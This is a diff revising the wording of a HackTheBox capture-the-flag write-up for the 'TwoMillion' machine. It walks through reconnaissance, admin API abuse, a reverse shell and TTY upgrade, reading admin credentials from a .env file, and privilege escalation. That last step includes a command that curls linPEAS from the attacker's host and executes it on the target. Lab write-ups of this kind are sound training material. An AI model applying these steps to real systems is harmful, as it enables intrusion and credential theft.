@@ -14,22 +14,14 @@ Details:
 - **Difficulty:** 3.8/10
 - **Key Vulnerabilities:** Broken Access Control, Command Injection, Credential Leakage, Kernel Exploit (CVE-2023-0386)
 
-*Throughout this write-up, I will be using the IP address I was assigned - 10.10.11.221 - if you are assigned a different IP address, make sure to change it when following along.*
-
-Before we can begin any of the steps below, you must be connected to the HackTheBox network. The machines are hosted on a private network that is only accessible via a VPN connection. You can download your unique OpenVPN configuration file from the HackTheBox Access Page. Once downloaded, you can connect from your terminal using the following command:
-```bash
-sudo openvpn /path/to/your/file.ovpn
-```
-
 ## Reconnaissance & Enumeration
 
-As with all penetration testing, we must first start by trying to gather as much information as we can about the IP we have been given. The most common tool for this is `nmap` which can reveal which ports on our target are open. A list of ports is a list of ways we can access the IP address - much more useful than just the IP alone.\
-I used the following command:
+The initial reconnaissance began with a service and version scan using `nmap` to map what ports were open on the target:
 ```bash
 nmap -sV -sC 10.10.11.221
 ```
-I used The `-sV` flag to output not just the port, but also what service version is running on it. An outdated service is often a very exploitable vector for attack.\
-I also used the flag `-sC` which runs a suite of specialised scripts when attempting to connect to each port to hopefully gather more information about them.
+- `-sV` outputs not just the port, but also what service version is running on it. An outdated service is often a very exploitable vector for attack.
+- `-sC` runs a suite of specialised scripts when attempting to connect to each port to hopefully gather more information about them.
 After the scan completes, we can now analyse the output:
 ```bash
 PORT   STATE SERVICE VERSION
@@ -41,15 +33,12 @@ PORT   STATE SERVICE VERSION
 |_http-title: Did not follow redirect to http://2million.htb/
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
-Firstly, we can see that there are two open ports - 22 (SSH) and 80 (HTTP). Each of these ports uses a specific service and version (from `-sV`) and has some additional information below it (from `-sC`).\
-Since the SSH is likely secured by a strong password, our first step should be to access the page via HTTP and see what we can learn from its website.\
-\
-When attempting to connect to `http://2million.htb` (the URL of the IP shown above in the `nmap` results) in my browser, it told me that it was unable to find the site.\
-The reason for this is that our browser doesn't know which IP to connect to for this URL, since it is only available via HackTheBox's openvpn network. To allow our browser to know which IP to send requests to for this URL, we need to add an entry in the `/etc/hosts` file.\
-The following command pipes the output of `echo` (our line that links the IP address to the URL) into `tee` which opens and appends (`-a`) our entry to `/etc/hosts`.
+
+The `nmap` output revealed the hostname http://2million.htb. I added an entry for this in my /etc/hosts file to resolve the domain to the target IP, allowing me to access the web application:
 ```bash
 echo "10.10.11.221 2million.htb" | sudo tee -a /etc/hosts
 ```
+
 We should now be able to access the site:
 
 ![2million.htb frontpage](../resources/writeups/TwoMillion1.png)
@@ -99,9 +88,9 @@ Connection: keep-alive
 ```
 After decoding, we now have our invite code and can sign up.
 
-## Initial Foothold
+## Exploitation & Initial Foothold
 
-We now have our initial foothold on the site - we have an account with access to the dashboard. We will now begin our act of exploitation to bypass security controls.\
+We will now begin our act of exploitation to bypass security controls.\
 Upon inspecting the dashboard, there is an interesting endpoint `/home/access` which allows you to generate a VPN for your user via an API.\
 Accessing `/api/v1` allows us to enumerate all the available API endpoints which provides us with incredibly useful information regarding admin API endpoints:
 ```json
@@ -203,12 +192,12 @@ Once we have completed this, we should then have a functional reverse shell acce
 
 ![Command output showing our reverse shell](../resources/writeups/TwoMillion3.png)
 
-**This is a great point to be at as we no longer need to use the website for anything and can now search for the user flag** however, this is a "dumb" shell; it's unstable, lacks tab-completion, and Ctrl+C will kill the entire session. To work more effectively, we should upgrade to a fully interactive TTY.
+Unfortunately, this is a "dumb" shell; it's unstable, lacks tab-completion, and Ctrl+C will kill the entire session. To work more effectively, we should upgrade to a fully interactive TTY.
 <br>
 <details>
-<summary><strong>Pro-Tip: Click here for a guide on upgrading to a fully interactive shell.</strong></summary>
+<summary><strong>Click here for a guide on upgrading to a fully interactive shell.</strong></summary>
 <br>
-<p>Upgrading a basic reverse shell often involves a standard, three-step process and is a critical step for any serious enumeration:</p>
+<p>Upgrading a basic reverse shell generally involves a standard, three-step process and is a critical step for any serious enumeration:</p>
 <p><strong>Step 1: Spawn a TTY using Python</strong></p>
 <pre><code>python -c 'import pty; pty.spawn("/bin/bash")'</code></pre>
 <p><strong>Step 2: Background the Shell and Stabilize with <code>stty</code></strong></p>
@@ -238,8 +227,8 @@ Going back to our home directory and into `~/html` we are presented with a host 
 ![Command output showing files and folders in ~/html](../resources/writeups/TwoMillion4.png)
 
 Something that instantly pops out is `Database.php` which we can tell, upon reading, creates a database storing usernames and passwords.\
-Since we don't seem to be able to access the database, we should look for other files that the database may use/may have created. One common file that php uses to store its **Environment Variables** is `.env`.\
-Indeed, this file is present, and reading it gives us access to the admin's credentials:
+To find out what these credentials might be, we should look for sensitive configuration files that we can read. In web applications `.env` files are commonly used to store database credentials and other secrets.
+This file happens to be present, and reading it gives us access to the admin's credentials:
 
 ![Command output showing the admin's credentials](../resources/writeups/TwoMillion5.png)
 
@@ -253,18 +242,18 @@ ssh admin@10.10.11.221 -p 22
 
 ## Privilege Escalation
 
-Now with user-level access, the goal is to become root. My methodology will start by running linPEAS to enumerate potential vulnerabilities.\
+Now with user-level access, the goal is to become root. My methodology will start with running linPEAS to enumerate potential vulnerabilities.\
 You can find linPEAS [here](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS) and once downloaded can get it on the target system by using a simple curl command to your IP.\
 We will also need to add execution (`+x`) permissions to this file:
 ```bash
 curl 10.10.14.107/linPEAS > /tmp/linPEAS
 cd /tmp
 chmod +x linPEAS
-./linPEAS
+./linPEAS -a > linpeas_output.txt
 ```
 *Keep in mind you will need to start a http server again if you closed your old one.*\
 \
-The linPEAS script highlighted lots of potential attack vectors, although one that particularly caught my eye was the existence of a mail location which actually contained an email:
+I ran LinPEAS with the `-a` flag for an exhaustive audit and redirected the output to a file. While reviewing the report, the 'Interesting Files' section highlighted mail in `/var/spool/`.
 
 ![linPEAS output showing mail directories](../resources/writeups/TwoMillion7.png)
 
